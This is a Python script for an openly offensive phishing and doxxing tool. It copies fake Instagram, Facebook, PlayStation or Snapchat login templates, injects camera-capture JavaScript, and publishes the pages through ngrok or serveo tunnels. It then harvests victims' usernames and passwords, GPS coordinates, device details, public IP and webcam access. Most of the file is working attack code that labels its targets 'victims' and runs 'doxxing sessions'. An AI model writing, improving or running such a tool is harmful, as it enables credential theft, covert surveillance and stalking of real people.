#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
##importing snapchat file with camera stealing##

from template.data.camera import *

################################################
from distutils.dir_util import copy_tree
import os
from os import system, path
import sys
import time
import json
import requests
import subprocess as subp
from sys import argv

os.system('mkdir photos')

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white
LM = '\033[1;95;5m' # light magenta blink

swd = os.getcwd()
os.chdir(swd)
usern = '{}/SERVER/php/usernames.txt'.format(swd)
result = '{}/SERVER/php/result.txt'.format(swd)
info = '{}/SERVER/php/info.txt'.format(swd)
cam = '{}/SERVER/php/Log.log'.format(swd)
ver = '1.5.7'

if sys.version_info[0] >= 3:
	raw_input = input

def banner():
	os.system('clear')
	
	print("{0}▄▄▄▄▄▄▄▄   ▄▄▄·  ▄▄· ▄ •▄              ▐ ▄ {1}".format(R, W))
	print("{0}•██  ▀▄ █·▐█ ▀█ ▐█ ▌▪█▌▄▌▪▪     ▪     •█▌▐█{1}".format(R, W))
	print("{0} ▐█.▪▐▀▀▄ ▄█▀▀█ ██ ▄▄▐▀▀▄· ▄█▀▄  ▄█▀▄ ▐█▐▐▌{1}".format(R, W))
	print("{0} ▐█▌·▐█•█▌▐█ ▪▐▌▐███▌▐█.█▌▐█▌.▐▌▐█▌.▐▌██▐█▌{1}".format(R, W))
	print("{0} ▀▀▀ .▀  ▀ ▀  ▀ ·▀▀▀ ·▀  ▀ ▀█▄▀▪ ▀█▄▀▪▀▀ █▪{1}".format(R, W))
	print("\n")
	print ('\n' + G + '[>]' + C + ' Created By : ' + W + 'Knightsec')
	print (G + '[>]' + C + ' Version    : ' + W + ver + '\n')
def artbann1():
    print("""
{0}  ,:\      /:.
{0} //  \_()_/  \\\            {2}   +-+-+-+-+-+-+-+-+-+              {0}    Snap    _   _ 
{0}||   |    |   ||           {2}   |K|n|i|g|h|t|s|e|c|              {0}       Me! (,\_/,)
{0}||   |    |   ||           {2}   +-+-+-+-+-+-+-+-+-+              {0}         \\  | " |   .-'
{0}||   |____|   ||                                                  {0}         )\g/(  (
{0} \\\  / || \  //                                                   {0}        /(   )\  )
{0}  `:/  ||  \;'        {1}   _____              _                  {3}{0}          |\)   (/|/
{0}       ||             {1}  |_   _|            | |                 {3}{0}          \   '   /
{0}       ||             {1}    | |_ __ __ _  ___| | _____   ___  _ __ {3}   {0}      (/---\)
{0}       XX             {1}    | | '__/ _` |/ __| |/ / _ \ / _ \| '_ \\{3}
{0}       XX             {1}    | | | | (_| | (__|   < (_) | (_) | | | |{3}
{0}       XX             {1}    \_/_|  \__,_|\___|_|\_\___/ \___/|_| |_|{3}
{0}       XX
{0}       OO
{0}       ()
{0}       <>
\n{3}
""".format(C, LM, R, W))
def network():
	try:
		requests.get('https://github.com/', timeout = 5)
		print (G + '[+]' + C + ' Checking Internet Connection...' + W, end='')
		print (G + ' Working' + W + '\n')
	except requests.ConnectionError:
		print (R + '[!]' + C + ' You are Not Connected to the Internet...Quiting...' + W)
		sys.exit()
def clear1():
    os.system("clear")
def webphish():
    	
    print(R + "[1]" + G + "Instagram\n"+ R + "[2]" + G + "Facebook\n" + R + "[3]" + G + "Playstation\n" + R + "[4]" + G + "Snapchat\n\n" + R + "[00]" + G + "Exit\n\n\n" + W)
    choose = input(C +"Choose Phishing Page >>> " + W)
    try:
        int(choose)
    except ValueError:
        clear1()
        webphish()
    try:

        if int(choose) == 1:
            copy_tree("template/instagram/", "SERVER/")
            Camodule()
        elif int(choose) == 2:
            copy_tree("template/facebook/", "SERVER/")
            Camodule()
        elif int(choose) == 3:
            copy_tree("template/playstation/", "SERVER/")
            Camodule()
        elif int(choose) == 4:
            copy_tree("template/snapchat/", "SERVER/")
            Camodule()   
        elif int(choose) =="00":
            exit()
        else:
            clear1()
            webphish()
    except ValueError:
        clear1()
        webphish()

            


def redirect():
    custom = input('''\n{0}Redirect Link ->> {1}'''.format(R, W))
    if 'http://' in custom or 'https://' in custom:
        pass
    else:
        custom = 'http://' + custom
    if path.exists('./SERVER/php/login.php'):
        with open('./SERVER/php/login.php') as f:
            read_data = f.read()
        c = read_data.replace('<CUSTOM>', custom)
        f = open('./SERVER/php/login.php', 'w')
        f.write(c)
        f.close()
        sergrok()
    else:
        with open('./SERVER/php/login.php') as f:
            read_data = f.read()
        c = read_data.replace('<CUSTOM>', custom)
        f = open('./SERVER/php/login.php', 'w')
        f.write(c)
        f.close()
        sergrok()
def sergrok():
    clear()
    artbann1()
    time.sleep(0.35)
    print(R + "[1]" + C + "Serveo (classic)\n" + R + "[2]" + C + "Serveo (custom)\n" + R + "[3]" + C + "Ngrok\n\n" + R + "[9]" + C + "Exit\n"+ W)
    choose_sk = input(R +"Choose ->> "+ W)
    try:
        int(choose_sk)
    except ValueError:
        sergrok()
    try:
        if int(choose_sk) == 1:
        
            serveoSimple()
        elif int(choose_sk) == 2:
        
            runServeoCustom()
        elif int(choose_sk) == 3:
        
            runNgrok()
        elif int(choose_sk) == 9:
            exit()
    
    except ValueError:
        clear()
        sergrok()

def runNgrok():
    os.system("clear")
    global api, site, swd, url
    flag = False
    os.system("mkdir link && touch link/ngrok.txt")
    print ('\n' + G + '[+]' + C + ' Starting PHP Server...' + W)
    with open ('php.log', 'w') as phplog:
	     subp.Popen(['php', '-S', '127.0.0.1:8080', '-t', '{}/SERVER/'.format(swd)], stderr=phplog, stdout=phplog)

    print ('\n' + G + '[+]' + C + ' Getting Ngrok URL...' + W + '\n')
    os.system('ngrok http 8080 > /dev/null &')
    time.sleep(5)
    os.system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > link/ngrok.txt')
    urlFile = open('link/ngrok.txt', 'r')
    url = urlFile.read()
    urlFile.close()
    while True:
        time.sleep(2)
        print (G + '[+]' + C + ' URL : ' + W + url)
        break
                
        
def runServeoCustom():
    os.system("clear")
    global api, site, swd, url
    flag = False
    os.system("mkdir link && touch link/serveo.txt")
    link1 = input(("\n {0}Custom Subdomain name ->  {1}").format(R, W))
    if not ".serveo.net" in link1:
        link1 += ".serveo.net"
    else:
        pass
    print ('\n' + G + '[+]' + C + ' Starting PHP Server...' + W)
    with open ('php.log', 'w') as phplog:
        subp.Popen(['php', '-S', '127.0.0.1:8080', '-t', '{}/SERVER/'.format(swd)], stderr=phplog, stdout=phplog)

    print ('\n' + G + '[+]' + C + ' Getting Serveo URL...' + W + '\n')
    with open ('link/serveo.txt', 'w') as tmpfile:
        proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '{}:80:localhost:8080'.format(link1), 'serveo.net'], stdout = tmpfile, stderr = tmpfile, stdin = subp.PIPE)

    while True:
    		
    	time.sleep(2)
    	with open ('link/serveo.txt', 'r') as tmpfile:
                    	try:
                            stdout = tmpfile.readlines()
                            if flag == False:
                                    for elem in stdout:
                                            if 'HTTP' in elem:
                                                    elem = elem.split(' ')
                                                    url = elem[4].strip()
                                                    url = url
                                                    print (G + '[+]' + C + ' URL : ' + W + url)
                                                    flag = True
                                            else:
                                                    pass
                            elif flag == True:
                                    break
                    	except Exception as e:
                            print (e)
                            pass
def serveoSimple():
        os.system("clear")
        global api, site, swd, url
        flag = False
        os.system("mkdir link && touch link/serveo.txt")
        print ('\n' + G + '[+]' + C + ' Starting PHP Server...' + W)
        with open ('php.log', 'w') as phplog:
	        subp.Popen(['php', '-S', '127.0.0.1:8080', '-t', '{}/SERVER/'.format(swd)], stderr=phplog, stdout=phplog)

        print ('\n' + G + '[+]' + C + ' Getting Serveo URL...' + W + '\n')
        with open ('link/serveo.txt', 'w') as tmpfile:
	        proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '80:localhost:8080', 'serveo.net'], stdout = tmpfile, stderr = tmpfile, stdin = subp.PIPE)

        while True:
         time.sleep(2)
         with open ('link/serveo.txt', 'r') as tmpfile:
                        try:
                                stdout = tmpfile.readlines()
                                if flag == False:
                                        for elem in stdout:
                                                if 'HTTP' in elem:
                                                        elem = elem.split(' ')
                                                        url = elem[4].strip()
                                                        url = url
                                                        print (G + '[+]' + C + ' URL : ' + W + url)
                                                        flag = True
                                                else:
                                                        pass
                                elif flag == True:
                                        break
                        except Exception as e:
                                print (e)
                                pass
def wait():
	printed = False
	while True:
		time.sleep(2)
		size = os.path.getsize(result)
		if size == 0 and printed == False:
			print('\n' + G + '[+]' + C + ' Waiting for User Interaction...' + W + '\n')
			printed = True
		if size > 0:
			menu()

def menu():
    global result, usern, info, file3
    try:
    	with open (info, 'r') as file2:
    		file2 = file2.read()
    		json3 = json.loads(file2)
    		for value in json3['dev']:
    			print (G + '[+]' + C + ' Device Information : ' + W + '\n')
    			print (G + '[+]' + C + ' OS         : ' + W + value['os'])
    			print (G + '[+]' + C + ' Platform   : ' + W + value['platform'])
    			try:
    				print (G + '[+]' + C + ' CPU Cores  : ' + W + value['cores'])
    			except TypeError:
    				pass
    			print (G + '[+]' + C + ' RAM        : ' + W + value['ram'])
    			print (G + '[+]' + C + ' GPU Vendor : ' + W + value['vendor'])
    			print (G + '[+]' + C + ' GPU        : ' + W + value['render'])
    			print (G + '[+]' + C + ' Resolution : ' + W + value['wd'] + 'x' + value['ht'])
    			print (G + '[+]' + C + ' Browser    : ' + W + value['browser'])
    			print (G + '[+]' + C + ' Public IP  : ' + W + value['ip'])
    			os.system("rm -rf SERVER/php/info.txt && touch SERVER/php/info.txt")
                
    	with open (result, 'r') as file3:
            
            file3 = file3.read()
            json2 = json.loads(file3)
            for value in json2['info']:
                lat = value['lat']
                lon = value['lon']
                acc = value['acc']
                alt = value['alt']
                dir = value['dir']
                spd = value['spd']  
                print ('\n' + G + '[+]' + C + ' Location Information : ' + W + '\n')
                print (G + '[+]' + C + ' Latitude  : ' + W + lat + C + ' deg')
                print (G + '[+]' + C + ' Longitude : ' + W + lon + C + ' deg')
                print (G + '[+]' + C + ' Accuracy  : ' + W + acc + C + ' m')
                print ('\n' + G + '[+]' + C + ' Google Maps : ' + W + 'https://www.google.com/maps/place/' + lat + '+' + lon)

                if alt == '':
                    print (R + '[-]' + C + ' Altitude  : ' + W + 'Not Available')
                else:
                    print (G + '[+]' + C + ' Altitude  : ' + W + alt + C + ' m')

                if dir == '':
                    print (R + '[-]' + C + ' Direction : ' + W + 'Not Available')
                else:
                    print (G + '[+]' + C + ' Direction : ' + W + dir + C + ' deg')

                if spd == '':
                    print (R + '[-]' + C + ' Speed     : ' + W + 'Not Available')
                else:
                    print (G + '[+]' + C + ' Speed     : ' + W + spd + C + ' m/s')
                os.system("rm -rf SERVER/php/result.txt && touch SERVER/php/result.txt")
                print(R + '\n[+]' + C + " CTRL + C to restart doxxing session!" + W)
                print(R + "\n[!]" + C + " Starting Cam Session...")
                time.sleep(2)
            camget()
    except ValueError:
        error = str(file3)
        print ('\n' + R + '[-] ' + W + error)
        print(R + '\n[+]' + G + " CTRL + C to restart doxxing session!\n" + W)
        camget()
		


def camget():
    time.sleep(10)
    try:
        with open (cam, 'r') as tmpfile:
                        
                                
                flag = False
                stdout = tmpfile.readlines()
                                
                for elem in stdout:        
                    print (G + '[+]' + C + ' Victim accepted Camera Acces!' + W)
                    time.sleep(2)
                    print (R + '\n[+]' + C + 'Waiting for Credentials...' + W)
                    flag = True
                    creds()
                                               
                                
                                
    except FileNotFoundError:
        print (G + '[+]' + C + ' Victim DENIED Camera Acces!' + W)
        time.sleep(2)
        print (R + '\n[+]' + C + 'Waiting for Credentials...' + W)
        creds()
                                
                                
def creds():
    while True:
        try:
            with open(usern, 'r') as credkey:
                cred_line = credkey.read().rstrip()
                if len(cred_line) != 0:
                    print('\n{1}[{3}!{1}]{0} Credentials Found!\n{2}{4}'.format(G, C, cred_line, R, W))
                    time.sleep(2)
                    print(R + "\n[!] " + C + "Restarting Doxxing Session..." + W)
                    os.system('rm -rf SERVER/php/usernames.txt && rm -rf SERVER/php/Log.log && touch SERVER/php/usernames.txt')
                    time.sleep(2)
                    repeat()
                else:
                    time.sleep(0.5)
                    creds()
        except KeyboardInterrupt:
            chosen = input(R+"\n["+C+"R"+R+"]"+C+"estart session?\n"+R+"["+C+"E"+R+"]"+C+"XIT\n-->> "+ W)
            chosen = chosen.upper()
            if chosen == str("E"):
                os.system("rm -Rf SERVER/ && rm -Rf link/")
                os.system("pkill -9 php && pkill -9 ssh")
                exit()
            elif chosen == str("R"):
                    print(R + "\n[!] " + C + "Restarting Doxxing Session... Tell the victim to refresh page!" + W)
                    repeat()
            else:
                os.system("rm -Rf SERVER/ && rm -Rf link/")
                os.system("pkill -9 php && pkill -9 ssh")
                exit()
def Camodule():
    redirect()
    filedata = str(Cam_Java)
    filedata = filedata.replace('forwarding_link', str(url))
    with open('./SERVER/js/camera.js', 'w') as file:
        file.write(filedata)

def clear():
	global result
	with open (result, 'w+'): pass
	with open (info, 'w+'): pass

def repeat():
    os.system("php -S 127.0.0.1:8080 -t {}/SERVER/ > /dev/null &".format(swd))
    clear()
    wait()
    menu()




try:
    banner()
    network()
    webphish()
    wait()
    menu()
        
        


        

except KeyboardInterrupt:
    print ('\n' + R + '[!]' + C + ' Keyboard Interrupt.' + W)
    os.system("rm -Rf SERVER/ && rm -Rf link/")
    os.system("pkill -9 php && pkill -9 ssh")
    exit()
